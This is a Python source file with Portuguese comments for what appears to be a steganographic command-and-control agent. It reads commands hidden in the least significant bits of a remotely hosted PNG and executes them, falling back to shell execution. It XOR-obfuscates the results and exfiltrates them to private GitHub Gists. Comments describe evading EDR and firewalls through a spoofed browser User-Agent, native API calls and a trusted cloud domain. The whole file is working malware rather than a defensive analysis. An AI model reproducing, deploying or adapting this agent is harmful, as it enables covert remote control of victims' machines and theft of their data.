from PIL import Image              # [ENGINEERING] Biblioteca essencial para manipulação de imagem (LSB/Steganography)
import requests                    # [REDE] Usada para o download da imagem do Dead Drop e o upload do resultado (Gists)
from io import BytesIO             # [REDE] Cria um objeto de arquivo virtual na memória (ponte entre requests e PIL)
import subprocess                  # Usado para o fallback (execução de comandos não nativos)
import sys                         # Utilidades de sistema (saída/erros)
import os                          # Interação nativa com o sistema de arquivos (ls, cd)
import platform                    # Para pegar dados do sistema (hostname)
import json                        # Essencial para construir o payload JSON do Gist
import pwd                         # [UNIX] Necessário para os.getlogin() de forma nativa e precisa
import time                        # Para o intervalo de beaconing (sleep)

# ==============================================================================
#  CONFIGURAÇÕES GLOBAIS DE OPSEC E C2
# ==============================================================================
DELIMITER = "EOF"                  # [PROTOCOLO] Assinatura de parada: O agente (decoder) sabe que a mensagem terminou aqui.
CHAVE_XOR_SAIDA = 0x55             # [OPSEC] Chave simples de ofuscação (XOR) para proteger o resultado.

# --- GITHUB CONFIG (ALVO DE EXFILTRAÇÃO) ---
# A chave deve ser lida da variável de ambiente GITHUB_PAT (Melhor OpSec do que hardcode).
# GITHUB_PAT = os.environ.get('GITHUB_PAT', 'TOKEN_NAO_CONFIGURADO') 
GITHUB_PAT = "ghp_seutokenaqui" 

# --- CAMADA DE EVASÃO DE REDE ---
# Fingimos ser um navegador Chrome (Spoofing) para contornar proxies que bloqueiam o User-Agent padrão do Python.
HEADERS_FAKE = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari:537.36',
    'Accept': 'application/vnd.github.v3+json', # Header específico para a API do GitHub
    'Accept-Language': 'en-US,en;q=0.5'
}

# ==============================================================================
#  FUNÇÕES AUXILIARES (CRIPTO/PARSING)
# ==============================================================================

def xor_string(texto):
    """
    [CANAL DE SAÍDA - XOR] Ofusca o resultado e converte para Hex.
    Esta é a primeira camada de proteção do dado exfiltrado.
    """
    dados = texto.encode('utf-8')
    cifrado = bytes([b ^ CHAVE_XOR_SAIDA for b in dados])
    return cifrado.hex() # Hex é usado pois é seguro para transporte via JSON/HTTP

def text_from_bits(bits):
    """[REVERSO LSB] Converte 8 bits de volta para um caractere ASCII."""
    try:
        n = int(bits, 2)
        # Decodifica o byte, ignorando erros para ser mais resiliente
        return n.to_bytes((n.bit_length() + 7) // 8, 'big').decode('utf-8', 'surrogatepass') or '\0'
    except: return '?'

def ler_mensagem_url(url):
    """
    [CANAL DE COMANDO - PULL] Baixa o Dead Drop (a imagem) da URL e extrai o comando.
    """
    try:
        print(f"\n [STEALTH] Checando Dead Drop: {url}")
        # Requisição HTTPS com Spoofing de User-Agent e Timeout de rede
        response = requests.get(url, headers=HEADERS_FAKE, timeout=15)
        response.raise_for_status() # Lança exceção para erros 4xx/5xx
    except Exception as e:
        return f"Erro download: {e}"

    try:
        # BytesIO + PIL: Cria um arquivo virtual na memória para a PIL ler a imagem.
        img = Image.open(BytesIO(response.content))
        bits_extraidos = ""
        
        # LSB CORE: Itera sobre a imagem, lendo o último bit do Vermelho (r & 1)
        for y in range(img.height):
             for x in range(img.width):
                 r, g, b = img.getpixel((x, y))
                 bits_extraidos += str(r & 1)

        texto_bruto = ""
        # Reconstroi o texto, 8 bits por vez (1 byte)
        for i in range(0, len(bits_extraidos), 8):
            byte = bits_extraidos[i:i+8]
            if len(byte) < 8: break
            char = text_from_bits(byte)
            texto_bruto += char
            
            # Condição de parada (STOP SIGN): Garante que a leitura pare no "EOF"
            if texto_bruto.endswith(DELIMITER):
                return texto_bruto[:-len(DELIMITER)].strip()
    except Exception as e: 
        return None
    return None

# ==============================================================================
#  FUNÇÃO ANTI-EDR: EXECUÇÃO NATIVA (Living off the Land)
# ==============================================================================

def executar_furtivo(comando_sujo):
    """
    [OPSEC] Executa comandos com prioridade em APIs nativas do Python para evitar
    a criação de processos filhos (cmd.exe/sh), o que é o principal alerta do EDR.
    """
    cmd_str = comando_sujo.strip()
    if not cmd_str: return "Comando vazio"
    
    cmd_parts = cmd_str.split()
    base = cmd_parts[0].lower()
    
    print(f" [EDR-Safe] Executando comando: {cmd_str}")

    try:
        # --- 1. EXECUÇÃO NATIVA (STEALTH TOTAL) ---
        if base == "whoami":
            # Usa o método mais preciso (os.getuid) ou fallback para environment variables.
            try: return pwd.getpwuid(os.getuid()).pw_name
            except: return os.environ.get('USER') or os.environ.get('USERNAME') or "unknown"
            
        elif base == "pwd" or base == "cd":
            # Usa a API 'os' diretamente, sem spawnar o shell.
            if base == "cd" and len(cmd_parts) > 1:
                os.chdir(" ".join(cmd_parts[1:]).strip())
            return os.getcwd()
            
        elif base == "ls" or base == "dir":
            # Leitura de diretórios via API (Mais seguro que subprocess)
            return "\n".join(os.listdir('.'))

        # --- 2. FALLBACK (RUIDOSO - RISCO DE DETECÇÃO) ---
        else:
             # Para comandos complexos (ex: netstat, ipconfig), somos forçados a usar o shell.
             print(" Invocando subprocess (RISCO EDR)...")
             # Subprocess cria o processo CMD/SH. O EDR monitora essa chamada.
             res = subprocess.run(comando_sujo, shell=True, capture_output=True, text=True, timeout=5)
             return (res.stdout + res.stderr).strip() or "Sem output"

    except subprocess.TimeoutExpired:
        return "Timeout (Comando demorou demais)"
    except Exception as e:
        # Retorna o erro curto para não gerar lixo na rede
        return f"Err: {str(e)[:30]}" 

# --- ENVIO COM CRIPTOGRAFIA (GITHUB GISTS) ---

def enviar_resultado(dados_claros):
    """
    [CANAL DE SAÍDA] Exfiltra dados via GitHub Gists API (HTTPS/443).
    Usa um domínio confiável para bypass de firewall (LotL - Cloud).
    """
    
    # CRÍTICO: Verifica se o token foi configurado (OpSec)
    if GITHUB_PAT == 'TOKEN_NAO_CONFIGURADO' or not GITHUB_PAT:
        print(" ERRO OPSEC: Token PAT não configurado. Exfiltração falhou.")
        return
        
    # 1. Criptografa a saída (XOR + HEX)
    dados_cifrados_hex = xor_string(dados_claros)

    # 2. Headers com Autenticação PAT
    headers = {
        'Authorization': f'token {GITHUB_PAT}',
        'User-Agent': HEADERS_FAKE['User-Agent'], # Usa o Chrome spoofado
        'Accept': 'application/vnd.github.v3+json'
    }

    # 3. Payload JSON (Estrutura do Gist Secreto)
    payload = {
        "description": f"System Log Check from {platform.node()} ({time.strftime('%Y-%m-%d %H:%M:%S')})",
        "public": False, # CRUCIAL: Gist Privado/Secreto
        "files": {
            "output_log.txt": {
                "content": dados_cifrados_hex 
            }
        }
    }
    
    url_api = "https://api.github.com/gists"
    
    try:
        # Envia o payload JSON via HTTPS (443)
        r = requests.post(url_api, headers=headers, data=json.dumps(payload))
        
        if r.status_code == 201:
            gist_url = r.json().get('html_url', 'URL não disponível')
            print(f" Exfiltração Sucesso! Link Secreto: {gist_url}")
        else:
            print(f" Falha de Exfiltração (Status {r.status_code}): {r.text[:100]}...")
            
    except Exception as e:
        print(f" Erro Crítico de Rede (API): {e}")

# ==============================================================================
#  MAIN EXECUTION FLOW (Polling Loop)
# ==============================================================================

if __name__ == "__main__":
    
    # Verifica se os módulos Unix-only estão disponíveis
    try:
        import pwd
    except ImportError:
        print("Aviso: Módulo 'pwd' (Unix) não encontrado. Usará fallback para whoami.")

    # --- CONFIGURAÇÃO DE INPUT ---
    url_input = input("URL da imagem PNG (Comando): ")
    if not url_input: url_input = "https://f3l1p3.neocities.org/stego.png"
        
    print("\n--- AGENTE C2 STEGANOGRAPHY ATIVO ---")
    print(f"Monitorando URL: {url_input}\n")
    
    # Variável de estado para evitar reexecução do mesmo comando (Anti-Beaconing)
    last_command_executed = None
    
    # Loop de Polling (Verificar a cada 30 segundos - Para OpSec)
    while True:
        comando_novo = ler_mensagem_url(url_input) 
        
        # LÓGICA DE ESTADO: Só executa se o comando for novo E não estiver vazio
        if comando_novo and comando_novo != last_command_executed:
            print(f" COMANDO Recebido: {comando_novo}")
            
            # Executa nativamente
            resultado = executar_furtivo(comando_novo)
            
            # Envia o resultado criptografado via Gist
            enviar_resultado(resultado)
            
            # Atualiza o estado
            last_command_executed = comando_novo
            
        # Sleep (Beaconing):
        print(f"\n[Dormindo por 30s...]")
        time.sleep(30)
